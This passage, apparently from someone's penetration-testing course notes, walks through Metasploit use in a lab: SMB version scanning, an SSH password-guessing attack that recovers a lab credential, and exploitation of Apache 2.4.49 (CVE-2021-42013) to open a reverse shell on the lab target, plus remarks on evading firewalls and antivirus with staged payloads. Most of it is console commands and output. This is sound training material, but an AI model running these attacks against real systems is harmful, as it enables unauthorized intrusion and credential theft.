Interact with a module by name or index. For example info 65, use 65 or use auxiliary/fileformat/multidrop
```
- This shows us all SMB aux modules the search has identified.

To activate a mod we enter `use` followed by the mod name or using the index provided from the search result.  Using the later, activate the mod `auxiliary/scanner/smb/smb_version` with index `56`.
```
msf6 > use 56
msf6 auxiliary(scanner/smb/smb_version) >
```
- The command prompt indicates the active module.

To get info about the current active mod we can enter `info`.
```
msf6 auxiliary(scanner/smb/smb_version) > info

       Name: SMB Version Detection
     Module: auxiliary/scanner/smb/smb_version
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm <x@hdm.io>
  Spencer McIntyre
  Christophe De La Fuente

Check supported:
  No

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOSTS                    yes       The target host(s), see https://docs.metasploit.c
                                      om/docs/using-metasploit/basics/using-metasploit.
                                      html
  THREADS  1                yes       The number of concurrent threads (max one per hos
                                      t)

Description:
  Fingerprint and display version information about SMB servers. Protocol
  information and host operating system (if available) will be reported.
  Host operating system detection requires the remote server to support
  version 1 of the SMB protocol. Compression and encryption capability
  negotiation is only present in version 3.1.1.


View the full module info with the info -d command.
```
- The description provides info about the purpose of the module.

The output shows the Basic options and args of the mod.  We can also display options of a mod by entering `show options`.  The options contain a column named `Required`, which specifies if a value needs to be set before launching a mod.  Most Metasploit mods will set some of the options for us.
```
msf6 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.
                                       com/docs/using-metasploit/basics/using-metasploi
                                       t.html
   THREADS  1                yes       The number of concurrent threads (max one per ho
                                       st)


View the full module info with the info, or info -d command.
```
- Shows the option RHOSTS has no value set but is required by the module.
 - *To display all required, but not yet set, options we can use the command show missing.*.

We can add or remove values from options with `set` and `unset`.  We will `set` the value of RHOSTS to the IP of BRUTE2.
```
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.197.202
RHOSTS => 192.168.197.202
```

Instead of setting the value manually we can set RHOSTS automatically with DB results.  We can set RHOSTS to all discovered hosts with open port 445 by entering `services`, the port number as `-p` arg, and `--rhosts` to set the results for this option.  First we `unset` the manually set value.
```
msf6 auxiliary(scanner/smb/smb_version) > unset RHOSTS
Unsetting RHOSTS...
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
Services
========

host             port  proto  name          state  info
----             ----  -----  ----          -----  ----
192.168.197.202  445   tcp    microsoft-ds  open

RHOSTS => 192.168.197.202
```
- Metasploit set the value for RHOSTS using DB results.

With required options set, we can launch the mod by entering `run`.
```
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.197.202:445   - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1, Pattern_V1) (encryption capabilities:AES-256-GCM) (signatures:optional) (guid:{ce3451ca-39b8-4812-a0d9-3e1ab8c7c379}) (authentication domain:BRUTE2)
[*] 192.168.197.202:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
- The output shows that the target system supports version 2/3 of SMB and prefers SMB 3.1.1.

Next, we use the `vulns` command to show if Metasploit detected any vulnerabilites based on the results of this module.
```
msf6 auxiliary(scanner/smb/smb_version) > vulns

Vulnerabilities
===============

Timestamp             Host             Name                     References
---------             ----             ----                     ----------
2023-11-20 00:12:27   192.168.197.202  SMB Signing Is Not Requ  URL-https://support.mic
UTC                                    ired                     rosoft.com/en-us/help/1
                                                                61372/how-to-enable-smb
                                                                -signing-in-windows-nt,
                                                                URL-https://support.mic
                                                                rosoft.com/en-us/help/8
                                                                87429/overview-of-serve
                                                                r-message-block-signing
```
- Our DB contains one vuln entry for [SMB Signing is not required](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing)
 - This is a great way to quickly identify vulns without the use of a vulnerability scanner.

Let's use another module.  In the Password Attacks Module, we succesfully identified the credentials on BRUTE with a dict attack agains SSH.  We can use Metasploit, instead of Hydra, to perform this attack.  First we `search` for SSH aux mods.
```
msf6 auxiliary(scanner/smb/smb_version) > search type:auxiliary ssh

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank    Check  Description
   -   ----                                                  ---------------  ----    -----  -----------
   0   auxiliary/scanner/ssh/apache_karaf_command_execution  2016-02-09       normal  No     Apache Karaf Default Credentials Command Execution
   1   auxiliary/scanner/ssh/karaf_login                                      normal  No     Apache Karaf Login Utility
   2   auxiliary/scanner/ssh/cerberus_sftp_enumusers         2014-05-27       normal  No     Cerberus FTP Server SFTP Username Enumeration
   3   auxiliary/dos/cisco/cisco_7937g_dos                   2020-06-02       normal  No     Cisco 7937G Denial-of-Service Attack
   4   auxiliary/admin/http/cisco_7937g_ssh_privesc          2020-06-02       normal  No     Cisco 7937G SSH Privilege Escalation
   5   auxiliary/scanner/http/cisco_firepower_login                           normal  No     Cisco Firepower Management Console 6.0 Login
   6   auxiliary/scanner/ssh/eaton_xpert_backdoor            2018-07-18       normal  No     Eaton Xpert Meter SSH Private Key Exposure Scanner
   7   auxiliary/scanner/ssh/fortinet_backdoor               2016-01-09       normal  No     Fortinet SSH Backdoor Scanner
   8   auxiliary/scanner/http/gitlab_user_enum               2014-11-21       normal  No     GitLab User Enumeration
   9   auxiliary/scanner/ssh/juniper_backdoor                2015-12-20       normal  No     Juniper SSH Backdoor Scanner
   10  auxiliary/scanner/ssh/detect_kippo                                     normal  No     Kippo SSH Honeypot Detector
   11  auxiliary/gather/qnap_lfi                             2019-11-25       normal  Yes    QNAP QTS and Photo Station Local File Inclusion
   12  auxiliary/fuzzers/ssh/ssh_version_15                                   normal  No     SSH 1.5 Version Fuzzer
   13  auxiliary/fuzzers/ssh/ssh_version_2                                    normal  No     SSH 2.0 Version Fuzzer
   14  auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                              normal  No     SSH Key Exchange Init Corruption
   15  auxiliary/scanner/ssh/ssh_login                                        normal  No     SSH Login Check Scanner
   16  auxiliary/scanner/ssh/ssh_identify_pubkeys                             normal  No     SSH Public Key Acceptance Scanner
   17  auxiliary/scanner/ssh/ssh_login_pubkey                                 normal  No     SSH Public Key Login Scanner
   18  auxiliary/scanner/ssh/ssh_enumusers                                    normal  No     SSH Username Enumeration
   19  auxiliary/fuzzers/ssh/ssh_version_corrupt                              normal  No     SSH Version Corruption
   20  auxiliary/scanner/ssh/ssh_version                                      normal  No     SSH Version Scanner
   21  auxiliary/dos/windows/ssh/sysax_sshd_kexchange        2013-03-17       normal  No     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service
   22  auxiliary/scanner/ssh/ssh_enum_git_keys                                normal  No     Test SSH Github Access
   23  auxiliary/scanner/ssh/libssh_auth_bypass              2018-10-16       normal  No     libssh Authentication Bypass Scanner


Interact with a module by name or index. For example info 23, use 23 or use auxiliary/scanner/ssh/libssh_auth_bypass
```

We will activate `auxiliary/scanner/ssh/ssh_login` using index `15` and display its options.
```
msf6 auxiliary(scanner/smb/smb_version) > use 15
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in
                                                 the current database
   DB_ALL_PASS       false            no        Add all passwords in the current databa
                                                se to the list
   DB_ALL_USERS      false            no        Add all users in the current database t
                                                o the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the
                                                 current database (Accepted: none, user
                                                , user&realm)
   PASSWORD                           no        A specific password to authenticate wit
                                                h
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://docs.me
                                                tasploit.com/docs/using-metasploit/basi
                                                cs/using-metasploit.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works f
                                                or a host
   THREADS           1                yes       The number of concurrent threads (max o
                                                ne per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords sep
                                                arated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for al
                                                l users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempt
                                                s


View the full module info with the info, or info -d command.
```
- There are various options to set in this module.
 - Metasploit already set several for us.
 - Similar to Hydra, we can set a password and user or provide files containing users, passwords, or both.

In the example Password Attacks, we assume we already identified user `george`, specify the `rockyou.txt` for options `PASS_FILE`. 
- Set `RHOSTS` to `192.168.197.201`
- Set `RPORT` to `2222`
```
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME george
USERNAME => george
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.197.201
RHOSTS => 192.168.197.201
msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222
RPORT => 2222
```

With the required options set we can launch the mod with `run`.
```
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 192.168.197.201:2222 - Starting bruteforce
[+] 192.168.197.201:2222 - Success: 'george:chocolate' 'uid=1000(george) gid=0(root) groups=0(root),27(sudo) Linux 9195ad6f4213 5.15.0-50-generic #56-Ubuntu SMP Tue Sep 20 13:23:26 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (192.168.45.182:34005 -> 192.168.197.201:2222) at 2023-11-19 16:39:30 -0800
```
- Metasploit performed the dict attack and determined the correct password.
 - Unlike Hydra, it also opens a session.

As with the `vulns` command, we can display all valid credentials with `creds`.
```
msf6 auxiliary(scanner/ssh/ssh_login) > creds
Credentials
===========

host             origin           service         public  private    realm  private_type  JtR Format
----             ------           -------         ------  -------    -----  ------------  ----------
192.168.197.201  192.168.197.201  2222/tcp (ssh)  george  chocolate         Password
```

Metasploit stores the valid creds in the DB, shows us the related host, the service, and the type of creds.


##### Exploit Modules

Exploit modules contain exploit code for applications and services with known vulns.  Metasploit contains over 2200 exploits (2023), each developed/tested, making MSF highly capable of exploiting a wide range of targets.  The exploits are invoked in a similar manner to auxiliary modules.

In this example we will access the target system, WEB18, using one of the included exploit modules.  Assume we identified the target systems running Apache 2.4.49 web server, vulnerable to CVE-2021-42013.  We'll attempt to use MSF and its exploit modules to get code execution.

Create a workspace for this section and search MSF for modules related to "Apache 2.4.49".
```
msf6 auxiliary(scanner/ssh/ssh_login) > workspace -a exploits
[*] Added workspace: exploits
[*] Workspace: exploits
msf6 auxiliary(scanner/ssh/ssh_login) > workspace 
  default
  pen200
* exploits
msf6 auxiliary(scanner/ssh/ssh_login) > search Apache 2.4.49

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
   1  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/apache_normalize_path
```
- Index `0` corresponding exploit.
- Index `1` vuln scanner for corresponding exploit.

Use the exploit and enter `info` to review its description.
```
msf6 auxiliary(scanner/ssh/ssh_login) > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > info

       Name: Apache 2.4.49/2.4.50 Traversal RCE
     Module: exploit/multi/http/apache_normalize_path_rce
   Platform: Unix, Linux
       Arch: cmd, x64, x86
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-05-10

Provided by:
  Ash Daulton
  Dhiraj Mishra
  mekhalleh (RAMELLA Sébastien)

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic (Dropper)
      1   Unix Command (In-Memory)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-41
                                        773, CVE-2021-42013)
  DEPTH      5                yes       Depth for Path Traversal
  Proxies                     no        A proxy chain of format type:host:port[,type:ho
                                        st:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit
                                        .com/docs/using-metasploit/basics/using-metaspl
                                        oit.html
  RPORT      443              yes       The target port (TCP)
  SSL        true             no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /cgi-bin         yes       Base path
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
  If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
  it can be used to execute arbitrary commands (Remote Command Execution).
  This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-41773
  https://nvd.nist.gov/vuln/detail/CVE-2021-42013
  https://httpd.apache.org/security/vulnerabilities_24.html
  https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse
  https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml
  https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74
  https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis


View the full module info with the info -d command.
```
- Output contains important info in the context of the exploit.
 - Before using we should understand what the module is doing by reviewing this info.
 - Output starts with general info.
  - Name.
  - Platform.
  - Arch.
 - Contains info about potential side effects.
  - IoC entries in log solutions.
  - Artifacts on disk.
 - Module stability.
  - If we might crash the target.
 - What info defenders may obtain from our using this exploit.

Module reliability determines if we can run the exploit more than once.  In our example the ouput states repeatable-session.  This is important because some exploit modules will only work once.

The targets availble area of the output contains target specs of vulerabile targets by the exploit mod, ranging from diff OS, app versions, to command exec methods.  Most mods provide the Automatic target which tries to identify either by itself or by using the defaul op specified in the module.

Descriptions provides us a text-based explanation of mod purpose, this mod appears to be correct mod for the vuln in this scenario.

Now we understand what the exploit mod does and what its implications are, we can display its options.
```
msf6 exploit(multi/http/apache_normalize_path_rce) > show options

Module options (exploit/multi/http/apache_normalize_path_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-4
                                         1773, CVE-2021-42013)
   DEPTH      5                yes       Depth for Path Traversal
   Proxies                     no        A proxy chain of format type:host:port[,type:h
                                         ost:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploi
                                         t.com/docs/using-metasploit/basics/using-metas
                                         ploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cgi-bin         yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Dropper)
```
- Similar to aux mod options.
 - Additional section `Payload options`
  - If unset, default payload will be selected.
   - Always better to explicitly set to maintain tight control of the exploit process.

For now, we will set Payload to a regular TCP reverse shell.  We can select with `set payload` and the payload name, `payload/linux/x64/shell_reverse_tcp`.  We also enter the IP of our Kali machine as `LHOST`.
```
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload payload/linux/x64/shell_reverse_tcp
payload => linux/x64/shell_reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > set LHOST 192.168.205.16
LHOST => 192.168.205.16
msf6 exploit(multi/http/apache_normalize_path_rce) > show options

Module options (exploit/multi/http/apache_normalize_path_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-4
                                         1773, CVE-2021-42013)
   DEPTH      5                yes       Depth for Path Traversal
   Proxies                     no        A proxy chain of format type:host:port[,type:h
                                         ost:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploi
                                         t.com/docs/using-metasploit/basics/using-metas
                                         ploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cgi-bin         yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.45.182   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Dropper)
```
- Entered payload now active.
- LHOST set.
- LPORT set default `4444`

*In real penetration tests we may face the situation that port 4444 is blocked by firewalls or other security technologies. This is quite common as it is the default port for Metasploit's modules. In situations like this, changing the port number to ports associated with more commonly used protocols such as HTTP or HTTPS may lead to a successful execution of the selected payload.*

Note that we don't need to start a manual listener with Netcat to catch the rev shell, Metasploit does this automatically for the selected payload.

Now, let's set the options `SSL` to `false` and `RPORT` to `80`, then set `RHOSTS` to target IP and enter `run`.
```
msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
RPORT => 80
msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.205.16
RHOSTS => 192.168.205.16
msf6 exploit(multi/http/apache_normalize_path_rce) > run

[*] Started reverse TCP handler on 192.168.45.182:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://192.168.205.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://192.168.205.16:80 - Attempt to exploit for CVE-2021-42013
[*] http://192.168.205.16:80 - Sending linux/x64/shell_reverse_tcp command payload
[*] Command shell session 2 opened (192.168.45.182:4444 -> 192.168.205.16:56688) at 2023-11-20 07:51:50 -0800
[!] This exploit may require manual cleanup of '/tmp/uHaCa' on the target

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
- The exploit starts a listener on `4444`
- Checks if target is vulnerable.
- Vuln exploited and payload sent.
- Console states session open and we have rce.

Let's explore the concept of sessions and jobs in Metasploit.  Sessions are used to interact and manage access to successfully exploited targets, while jobs are used to run modules or features in the background.

When we launched the exploit with `run`, a session was created and we obtained a shell.  We can background the session with `Ctrl+Z` and prompt confirmation.  Once sent to the background, we can use `sessions -l` to list all active sessions.
```
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
^Z
Background session 2? [y/N]  y
msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -l

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  2         shell x64/linux               192.168.45.182:4444 -> 192.168.205.16:56688 (
                                          192.168.205.16)
```
- Provides info about target and payload in use.
 - Making it easy to identify which session manages access to which target.

Interact with a session again by passing the session ID to `sessions -i`.
```
msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -i 2
[*] Starting interaction with 2...

uname -a
Linux 5def8107a7b2 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```
- We can enter commands into the interactive shell again.
- Kill a session with `sessions -k` and the ID as arg.  .

Instead of launching an exploit and sending the resulting session to the background, we can use `run -j` to launch it in the context of a job.  We'll still get the output of the mod, but need to interact with the session before we can access it.

In an assessment, we face many targets, making it easy to lose track of machines we already have access to.  Using a framework like MSF helps us manage access to these systems.  Eliminating the need to search through terminals for the correct session.  Launch exploit modules with `run -j` to launch exploit modules in the background, MDF will create the session for us, while we are already working on the next target.

MSF also stores info about targets, mod results, and vulns in the DB.  Valuable for furhter steps in the pentest and reporting to the client.

#### 20.2 Using Metasploit Payloads

- Understand the differences between staged and non-staged payloads.
- Explore the Meterpreter payload.
- Create executable payloads.

##### Staged vs Non-Staged Payloads

Let's explore the difference between stages and non-staged payloads.  Assume we have identified a buffer overflow vuln in a server.  As we learned, we must be aware of the buffer size our shellcode will be stored in.  If the shellcode size exceeds buffer, our exploit will fail, making payload type vital.

The diff is subtle but important.  A non-staged payload is sent complete with the exploit, the payload contains the exploit and full shellcode for task.  Generally, these all-in-one payloads are more stable, but the size is larger than other types.

Staged payloads are sent in two parts.  The first is a small primary payload that has the victim connect back to the attacker, transfering a larget secondary payload with the rest of the shellcode, finally executing it.

There are several situations in which we would prefer to use a staged payload instead of non-staged.  A staged payload may be a better choice when there are space limitations in an exploit, they are typically smaller.  AV can detect shellcode in an exploit, by utilizing a first stage, which loads second stage shellcode, retrieving the shellcode and injecting into memory detection may be prevented, increasing out chances of success.

With our basic understanding of the two payload types, we will use the same exploit mod as in the prior section and enter `show payloads`, getting a list of all compatible payloads.
```
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
...
   15  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
...
   20  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
...
```
- Shows the payload we used at index `20`
- The `/` char is used to denote whether a payload is staged or not.
 - `shell_reverse_tcp` at `20` is not staged.
 - `shell/reverse_tcp` at `15` is staged.

Use the staged payload for this exploit module and launch it, Metasploit will reuse the vals for the options form the previous payload.
```
msf6 exploit(multi/http/apache_normalize_path_rce) > db_nmap -A 192.168.250.16
[*] Nmap: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-21 07:15 PST
[*] Nmap: Nmap scan report for 192.168.250.16
[*] Nmap: Host is up (0.076s latency).
[*] Nmap: Not shown: 998 closed tcp ports (reset)
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   3072 ac:d6:d2:e6:6f:60:c2:ed:bc:0e:be:8f:75:e9:37:86 (RSA)
[*] Nmap: |   256 35:fb:0b:12:ef:d8:f1:f5:d6:82:f9:b9:8d:15:84:00 (ECDSA)
[*] Nmap: |_  256 5a:28:c2:ae:cd:f0:e6:6c:f4:e3:0c:ad:c4:ff:f7:eb (ED25519)
[*] Nmap: 80/tcp open  http    Apache httpd 2.4.49 ((Unix))
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE
[*] Nmap: |_http-title: PikaPika
[*] Nmap: |_http-server-header: Apache/2.4.49 (Unix)
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
[*] Nmap: TCP/IP fingerprint:
[*] Nmap: OS:SCAN(V=7.94%E=4%D=11/21%OT=22%CT=1%CU=34052%PV=Y%DS=4%DC=T%G=Y%TM=655CC9
[*] Nmap: OS:B4%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=107%TI=Z%II=I%TS=A)OPS(O1=M
[*] Nmap: OS:551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW7%
[*] Nmap: OS:O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%
[*] Nmap: OS:DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
[*] Nmap: OS:0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
[*] Nmap: OS:T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=4D
[*] Nmap: OS:C2%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
[*] Nmap: Network Distance: 4 hops
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: TRACEROUTE (using port 23/tcp)
[*] Nmap: HOP RTT      ADDRESS
[*] Nmap: 1   75.94 ms 192.168.45.1
[*] Nmap: 2   75.93 ms 192.168.45.254
[*] Nmap: 3   77.58 ms 192.168.251.1
[*] Nmap: 4   77.64 ms 192.168.250.16
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 25.12 seconds
msf6 exploit(multi/http/apache_normalize_path_rce) > hosts

Hosts
=====

address         mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------         ---  ----  -------  ---------  -----  -------  ----  --------
192.168.250.16             Linux               2.6.X  server

msf6 exploit(multi/http/apache_normalize_path_rce) > services 
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
192.168.250.  22    tcp    ssh   open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 Ubuntu Linux; p
16                                      rotocol 2.0
192.168.250.  80    tcp    http  open   Apache httpd 2.4.49 (Unix)
16

msf6 exploit(multi/http/apache_normalize_path_rce) > search Apache httpd 2.4.49

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
   1  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/apache_normalize_path

msf6 exploit(multi/http/apache_normalize_path_rce) > use 0
[*] Using configured payload linux/x64/shell/reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > info

       Name: Apache 2.4.49/2.4.50 Traversal RCE
     Module: exploit/multi/http/apache_normalize_path_rce
   Platform: Unix, Linux
       Arch: cmd, x64, x86
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-05-10

Provided by:
  Ash Daulton
  Dhiraj Mishra
  mekhalleh (RAMELLA Sébastien)

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic (Dropper)
      1   Unix Command (In-Memory)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-41
                                        773, CVE-2021-42013)
  DEPTH      5                yes       Depth for Path Traversal
  Proxies                     no        A proxy chain of format type:host:port[,type:ho
                                        st:port][...]
  RHOSTS     192.168.250.16   yes       The target host(s), see https://docs.metasploit
                                        .com/docs/using-metasploit/basics/using-metaspl
                                        oit.html
  RPORT      80               yes       The target port (TCP)
  SSL        true             no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /cgi-bin         yes       Base path
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
  If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
  it can be used to execute arbitrary commands (Remote Command Execution).
  This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-41773
  https://nvd.nist.gov/vuln/detail/CVE-2021-42013
  https://httpd.apache.org/security/vulnerabilities_24.html
  https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse
  https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml
  https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74
  https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis


View the full module info with the info -d command.

msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
msf6 exploit(multi/http/apache_normalize_path_rce) > info

       Name: Apache 2.4.49/2.4.50 Traversal RCE
     Module: exploit/multi/http/apache_normalize_path_rce
   Platform: Unix, Linux
       Arch: cmd, x64, x86
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-05-10

Provided by:
  Ash Daulton
  Dhiraj Mishra
  mekhalleh (RAMELLA Sébastien)

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic (Dropper)
      1   Unix Command (In-Memory)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-41
                                        773, CVE-2021-42013)
  DEPTH      5                yes       Depth for Path Traversal
  Proxies                     no        A proxy chain of format type:host:port[,type:ho
                                        st:port][...]
  RHOSTS     192.168.250.16   yes       The target host(s), see https://docs.metasploit
                                        .com/docs/using-metasploit/basics/using-metaspl
                                        oit.html
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /cgi-bin         yes       Base path
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
